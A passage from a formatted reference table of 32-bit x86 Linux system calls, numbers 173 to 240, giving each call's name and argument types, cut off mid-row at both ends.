option</font> | <font style=\"color:#4f4f4f;\">unsigned long arg2</font> | <font style=\"color:#4f4f4f;\">unsigned long arg3</font> | <font style=\"color:#4f4f4f;\">unsigned long arg4</font> | <font style=\"color:#4f4f4f;\">unsigned long arg5</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">173.</font> | <font style=\"color:#4f4f4f;\">rt_sigreturn</font> | <font style=\"color:#4f4f4f;\">173.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">174.</font> | <font style=\"color:#4f4f4f;\">rt_sigaction</font> | <font style=\"color:#4f4f4f;\">174.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">const struct sigaction *</font> | <font style=\"color:#4f4f4f;\">struct sigaction *</font> | <font style=\"color:#4f4f4f;\">size_t</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">175.</font> | <font style=\"color:#4f4f4f;\">rt_sigprocmask</font> | <font style=\"color:#4f4f4f;\">175.</font> | <font style=\"color:#4f4f4f;\">int how</font> | <font style=\"color:#4f4f4f;\">sigset_t *set</font> | <font style=\"color:#4f4f4f;\">sigset_t *oset</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">176.</font> | <font style=\"color:#4f4f4f;\">rt_sigpending</font> | <font style=\"color:#4f4f4f;\">176.</font> | <font style=\"color:#4f4f4f;\">sigset_t *set</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">177.</font> | <font style=\"color:#4f4f4f;\">rt_sigtimedwait</font> | <font style=\"color:#4f4f4f;\">177.</font> | <font style=\"color:#4f4f4f;\">const sigset_t *uthese</font> | <font style=\"color:#4f4f4f;\">siginfo_t *uinfo</font> | <font style=\"color:#4f4f4f;\">const struct timespec *uts</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">178.</font> | <font style=\"color:#4f4f4f;\">rt_sigqueueinfo</font> | <font style=\"color:#4f4f4f;\">178.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">siginfo_t *uinfo</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">179.</font> | <font style=\"color:#4f4f4f;\">rt_sigsuspend</font> | <font style=\"color:#4f4f4f;\">179.</font> | <font style=\"color:#4f4f4f;\">sigset_t *unewset</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">180.</font> | <font style=\"color:#4f4f4f;\">pread64</font> | <font style=\"color:#4f4f4f;\">180.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">loff_t pos</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">181.</font> | <font style=\"color:#4f4f4f;\">pwrite64</font> | <font style=\"color:#4f4f4f;\">181.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">const char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">loff_t pos</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">182.</font> | <font style=\"color:#4f4f4f;\">chown</font> | <font style=\"color:#4f4f4f;\">182.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">gid_t group</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">183.</font> | <font style=\"color:#4f4f4f;\">getcwd</font> | <font style=\"color:#4f4f4f;\">183.</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">unsigned long size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">184.</font> | <font style=\"color:#4f4f4f;\">capget</font> | <font style=\"color:#4f4f4f;\">184.</font> | <font style=\"color:#4f4f4f;\">cap_user_header_t header</font> | <font style=\"color:#4f4f4f;\">cap_user_data_t dataptr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">185.</font> | <font style=\"color:#4f4f4f;\">capset</font> | <font style=\"color:#4f4f4f;\">185.</font> | <font style=\"color:#4f4f4f;\">cap_user_header_t header</font> | <font style=\"color:#4f4f4f;\">const cap_user_data_t data</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">186.</font> | <font style=\"color:#4f4f4f;\">sigaltstack</font> | <font style=\"color:#4f4f4f;\">186.</font> | <font style=\"color:#4f4f4f;\">const struct sigaltstack *uss</font> | <font style=\"color:#4f4f4f;\">struct sigaltstack *uoss</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">187.</font> | <font style=\"color:#4f4f4f;\">sendfile</font> | <font style=\"color:#4f4f4f;\">187.</font> | <font style=\"color:#4f4f4f;\">int out_fd</font> | <font style=\"color:#4f4f4f;\">int in_fd</font> | <font style=\"color:#4f4f4f;\">off_t *offset</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">188.</font> | <font style=\"color:#4f4f4f;\">getpmsg</font> | <font style=\"color:#4f4f4f;\">188.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">189.</font> | <font style=\"color:#4f4f4f;\">putpmsg</font> | <font style=\"color:#4f4f4f;\">189.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">190.</font> | <font style=\"color:#4f4f4f;\">vfork</font> | <font style=\"color:#4f4f4f;\">190.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">191.</font> | <font style=\"color:#4f4f4f;\">ugetrlimit</font> | <font style=\"color:#4f4f4f;\">191.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">192.</font> | <font style=\"color:#4f4f4f;\">mmap2</font> | <font style=\"color:#4f4f4f;\">192.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">193.</font> | <font style=\"color:#4f4f4f;\">truncate64</font> | <font style=\"color:#4f4f4f;\">193.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">loff_t length</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">194.</font> | <font style=\"color:#4f4f4f;\">ftruncate64</font> | <font style=\"color:#4f4f4f;\">194.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">loff_t length</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">195.</font> | <font style=\"color:#4f4f4f;\">stat64</font> | <font style=\"color:#4f4f4f;\">195.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct stat64 *statbuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">196.</font> | <font style=\"color:#4f4f4f;\">lstat64</font> | <font style=\"color:#4f4f4f;\">196.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct stat64 *statbuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">197.</font> | <font style=\"color:#4f4f4f;\">fstat64</font> | <font style=\"color:#4f4f4f;\">197.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">struct stat64 *statbuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">198.</font> | <font style=\"color:#4f4f4f;\">lchown32</font> | <font style=\"color:#4f4f4f;\">198.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">199.</font> | <font style=\"color:#4f4f4f;\">getuid32</font> | <font style=\"color:#4f4f4f;\">199.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">200.</font> | <font style=\"color:#4f4f4f;\">getgid32</font> | <font style=\"color:#4f4f4f;\">200.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">201.</font> | <font style=\"color:#4f4f4f;\">geteuid32</font> | <font style=\"color:#4f4f4f;\">201.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">202.</font> | <font style=\"color:#4f4f4f;\">getegid32</font> | <font style=\"color:#4f4f4f;\">202.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">203.</font> | <font style=\"color:#4f4f4f;\">setreuid32</font> | <font style=\"color:#4f4f4f;\">203.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">204.</font> | <font style=\"color:#4f4f4f;\">setregid32</font> | <font style=\"color:#4f4f4f;\">204.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">205.</font> | <font style=\"color:#4f4f4f;\">getgroups32</font> | <font style=\"color:#4f4f4f;\">205.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">206.</font> | <font style=\"color:#4f4f4f;\">setgroups32</font> | <font style=\"color:#4f4f4f;\">206.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">207.</font> | <font style=\"color:#4f4f4f;\">fchown32</font> | <font style=\"color:#4f4f4f;\">207.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">208.</font> | <font style=\"color:#4f4f4f;\">setresuid32</font> | <font style=\"color:#4f4f4f;\">208.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">209.</font> | <font style=\"color:#4f4f4f;\">getresuid32</font> | <font style=\"color:#4f4f4f;\">209.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">210.</font> | <font style=\"color:#4f4f4f;\">setresgid32</font> | <font style=\"color:#4f4f4f;\">210.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">211.</font> | <font style=\"color:#4f4f4f;\">getresgid32</font> | <font style=\"color:#4f4f4f;\">211.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">212.</font> | <font style=\"color:#4f4f4f;\">chown32</font> | <font style=\"color:#4f4f4f;\">212.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">213.</font> | <font style=\"color:#4f4f4f;\">setuid32</font> | <font style=\"color:#4f4f4f;\">213.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">214.</font> | <font style=\"color:#4f4f4f;\">setgid32</font> | <font style=\"color:#4f4f4f;\">214.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">215.</font> | <font style=\"color:#4f4f4f;\">setfsuid32</font> | <font style=\"color:#4f4f4f;\">215.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">216.</font> | <font style=\"color:#4f4f4f;\">setfsgid32</font> | <font style=\"color:#4f4f4f;\">216.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">217.</font> | <font style=\"color:#4f4f4f;\">pivot_root</font> | <font style=\"color:#4f4f4f;\">217.</font> | <font style=\"color:#4f4f4f;\">const char *new_root</font> | <font style=\"color:#4f4f4f;\">const char *put_old</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">218.</font> | <font style=\"color:#4f4f4f;\">mincore</font> | <font style=\"color:#4f4f4f;\">218.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned char * vec</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">219.</font> | <font style=\"color:#4f4f4f;\">madvise</font> | <font style=\"color:#4f4f4f;\">219.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">int behavior</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">220.</font> | <font style=\"color:#4f4f4f;\">getdents64</font> | <font style=\"color:#4f4f4f;\">220.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct linux_dirent64 *dirent</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">221.</font> | <font style=\"color:#4f4f4f;\">fcntl64</font> | <font style=\"color:#4f4f4f;\">221.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">unsigned long arg</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">222.</font> | <font style=\"color:#4f4f4f;\">not implemented</font> | <font style=\"color:#4f4f4f;\">222.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">223.</font> | <font style=\"color:#4f4f4f;\">not implemented</font> | <font style=\"color:#4f4f4f;\">223.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">224.</font> | <font style=\"color:#4f4f4f;\">gettid</font> | <font style=\"color:#4f4f4f;\">224.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">225.</font> | <font style=\"color:#4f4f4f;\">readahead</font> | <font style=\"color:#4f4f4f;\">225.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">226.</font> | <font style=\"color:#4f4f4f;\">setxattr</font> | <font style=\"color:#4f4f4f;\">226.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">const void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">227.</font> | <font style=\"color:#4f4f4f;\">lsetxattr</font> | <font style=\"color:#4f4f4f;\">227.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">const void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">228.</font> | <font style=\"color:#4f4f4f;\">fsetxattr</font> | <font style=\"color:#4f4f4f;\">228.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">const void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">229.</font> | <font style=\"color:#4f4f4f;\">getxattr</font> | <font style=\"color:#4f4f4f;\">229.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">230.</font> | <font style=\"color:#4f4f4f;\">lgetxattr</font> | <font style=\"color:#4f4f4f;\">230.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">231.</font> | <font style=\"color:#4f4f4f;\">fgetxattr</font> | <font style=\"color:#4f4f4f;\">231.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">232.</font> | <font style=\"color:#4f4f4f;\">listxattr</font> | <font style=\"color:#4f4f4f;\">232.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">char *list</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">233.</font> | <font style=\"color:#4f4f4f;\">llistxattr</font> | <font style=\"color:#4f4f4f;\">233.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">char *list</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">234.</font> | <font style=\"color:#4f4f4f;\">flistxattr</font> | <font style=\"color:#4f4f4f;\">234.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">char *list</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">235.</font> | <font style=\"color:#4f4f4f;\">removexattr</font> | <font style=\"color:#4f4f4f;\">235.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">236.</font> | <font style=\"color:#4f4f4f;\">lremovexattr</font> | <font style=\"color:#4f4f4f;\">236.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">237.</font> | <font style=\"color:#4f4f4f;\">fremovexattr</font> | <font style=\"color:#4f4f4f;\">237.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">238.</font> | <font style=\"color:#4f4f4f;\">tkill</font> | <font style=\"color:#4f4f4f;\">238.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">239.</font> | <font style=\"color:#4f4f4f;\">sendfile64</font> | <font style=\"color:#4f4f4f;\">239.</font> | <font style=\"color:#4f4f4f;\">int out_fd</font> | <font style=\"color:#4f4f4f;\">int in_fd</font> | <font style=\"color:#4f4f4f;\">loff_t *offset</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">240.</font> | <font style=\"color:#4f4f4f;\">futex</font> | <font style=\"color:#4f4f4f;\">240.</font> | <font style=\"color:#4f4f4f;\">u32 *uaddr</font> | <font 